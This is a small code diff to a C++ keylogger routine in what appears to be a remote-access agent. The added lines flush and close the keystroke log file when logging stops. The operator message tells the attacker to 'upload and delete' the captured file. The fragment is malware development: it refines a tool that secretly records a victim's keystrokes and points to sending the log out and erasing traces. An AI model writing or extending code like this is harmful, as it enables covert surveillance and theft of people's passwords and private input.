@@ -212,6 +212,8 @@ void Agent::keylogger(bool state)
 			{
 				TerminateThread(keylogger_task, NULL);
 			}
+			fflush(keylogger_output_stream);
+			fclose(keylogger_output_stream);
 			send_output("Keylogger STOPPED, and output file is \"" + keylogger_file + "\". Remember to upload and delete it");
 			return;
 		}
